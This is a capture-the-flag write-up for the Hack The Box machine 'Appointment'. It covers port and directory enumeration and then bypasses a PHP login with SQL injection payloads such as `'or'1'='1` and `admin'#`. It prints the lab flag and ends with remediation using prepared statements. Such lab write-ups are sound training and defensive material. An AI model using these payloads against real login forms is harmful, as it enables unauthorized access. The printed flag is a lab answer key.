# Appointment — Hack The Box Writeup

**Platform:** Hack The Box — Starting Point, Tier 1  
**OS:** Linux  
**Difficulty:** Very Easy  
**Vulnerability:** SQL Injection (A03:2021 — Injection, OWASP Top 10)  
**Flag:** `e3d0796d002a446c0e622226f42e9672`

---

## Table of Contents

1. [Introduction](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#introduction)
2. [Enumeration](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#enumeration)
3. [Foothold](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#foothold)
4. [Flag](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#flag)
5. [Remediation](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#remediation)
6. [Lessons Learned](https://claude.ai/chat/7933f482-10c8-41f6-8621-90b4b0e1746f#lessons-learned)

---

## Introduction

Appointment is a Linux-based web application machine focused on SQL Injection. The goal is to bypass a login form by exploiting improper input sanitization in a PHP-backed authentication flow.

The methodology followed a standard black-box approach: starting from zero knowledge, the target was fully enumerated before any exploitation attempt was made, ruling out alternative attack surfaces and confirming the SQL Injection vector through evidence rather than assumption.

---

## Enumeration

### Host Reachability

Before any scan, connectivity to the target was confirmed:

```bash
ping 10.129.62.68
```

The host responded with stable RTT (~29ms), confirming it was up and reachable over the VPN.

---

### Port Scanning

A full TCP SYN scan with service and script detection was performed:

```bash
sudo nmap -sS -sC -sV -p- 10.129.62.68
```

![Nmap scan and Gobuster results](https://claude.ai/chat/01-nmap-gobuster.png)

**Result:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
```

Only port 80 was open. No SSH, FTP, SMB, or other services were exposed, limiting the attack surface to the web application alone. No known CVEs were identified for Apache 2.4.38 on Debian.

---

### Web Fingerprinting

```bash
whatweb http://10.129.62.68
```

![WhatWeb output and Nmap service scan](https://claude.ai/chat/02-whatweb-nmap.png)

**Result:**

```
[200 OK] Apache[2.4.38], Bootstrap, HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)],
JQuery[3.2.1], PasswordField[password], Script, Title[Login]
```

Key findings:

- jQuery 3.2.1 (outdated, but no exploitable XSS vector in this context)
- A `PasswordField[password]` element confirmed the presence of a login form
- No unusual headers or technologies detected

---

### Directory Enumeration

```bash
gobuster dir -u http://10.129.62.68/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Result:**

```
.hta             (Status: 403)
.htaccess        (Status: 403)
.htpasswd        (Status: 403)
/css             (Status: 301)
/fonts           (Status: 301)
/images          (Status: 301)
/index.php       (Status: 200)
/js              (Status: 301)
/server-status   (Status: 403)
/vendor          (Status: 301)
```

All redirects (301) led to static asset directories containing only CSS, fonts, images, and JavaScript — nothing exploitable. No admin panels, backup files, or configuration files were exposed.

`robots.txt` was also manually checked — it returned 404. The page source of `index.php` was reviewed and contained no sensitive comments, hardcoded credentials, or hidden fields.

---

### Default Credential Testing

Before attempting injection, common default credential pairs were tested manually:

|Username|Password|Result|
|---|---|---|
|admin|admin|Failed|
|admin|password|Failed|
|guest|guest|Failed|
|root|root|Failed|
|administrator|administrator|Failed|

All attempts failed. No credential brute-forcing was attempted to avoid triggering potential lockout mechanisms.

---

### Summary of Enumeration

At this point, all standard attack surfaces had been ruled out:

- No alternative open ports
- No hidden directories or exposed admin panels
- No sensitive information in page source or `robots.txt`
- No default credentials accepted

The only remaining attack surface was the login form itself. Given the PHP stack and the SQL backend implied by the login logic, SQL Injection was identified as the primary vector to investigate.

---

## Foothold

### Understanding the Target

The login form sends a POST request to `index.php` with `username` and `password` fields. A typical PHP login implementation constructs a query similar to:

```php
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($sql);
$count = mysql_num_rows($result);
if ($count == 1) {
    // login successful
}
```

If no input validation or parameterized queries are in place, user-supplied data is embedded directly into the SQL statement, allowing an attacker to alter its logic.

---

### Identifying the Injection Point

SQL Injection was confirmed by the absence of any input sanitization. A single quote `'` submitted in the username field caused unexpected server-side behavior, indicating the input was being interpreted as SQL syntax rather than as a literal string.

---

### Crafting the Payload

The following payload was used in the **password** field:

```
Username: admin
Password: anything 'or'1'='1
```

This transforms the backend query into:

```sql
SELECT * FROM users WHERE username='admin' AND password='anything' OR '1'='1'
```

Due to SQL operator precedence, the `OR '1'='1'` condition (which is always true) causes the entire WHERE clause to evaluate as true. The database returns a matching row, the `$count` variable equals 1, and the application grants access.

**Alternative payload (acting on the username field):**

```
Username: admin'#
Password: (anything)
```

This comments out the password check entirely:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything'
```

Both payloads achieve the same result via different mechanisms: the first overrides the condition with OR, the second eliminates the password check with a comment.

---

## Flag

After submitting the payload, the application returned the success page:

![Flag page](https://claude.ai/chat/03-flag.png)

```
e3d0796d002a446c0e622226f42e9672
```

---

## Remediation

The vulnerability stems from directly embedding user input into SQL queries without sanitization. The correct fix is to use **prepared statements (parameterized queries)**:

```php
// Vulnerable
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";

// Secure
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

With prepared statements, the database driver separates SQL structure from data. Any special characters in the input (`'`, `#`, `--`) are treated as literal values, not SQL syntax, making injection impossible.

Additional hardening recommendations:

- Implement server-side input validation
- Use a Web Application Firewall (WAF) to detect injection patterns
- Apply the principle of least privilege to the database user (no DDL/DML beyond what is needed)
- Enable error suppression in production to avoid leaking SQL error messages

---

## Lessons Learned

- Full enumeration before exploitation avoids rabbit holes and builds a complete picture of the attack surface
- SQL Injection on login forms is not limited to a single payload — understanding the underlying query logic allows for flexible adaptation
- The OWASP classification for this vulnerability is **A03:2021 — Injection**
- Comment operators differ by database engine (`#` for MySQL, `--` for MSSQL/PostgreSQL); knowing both variants is essential for real-world assessments
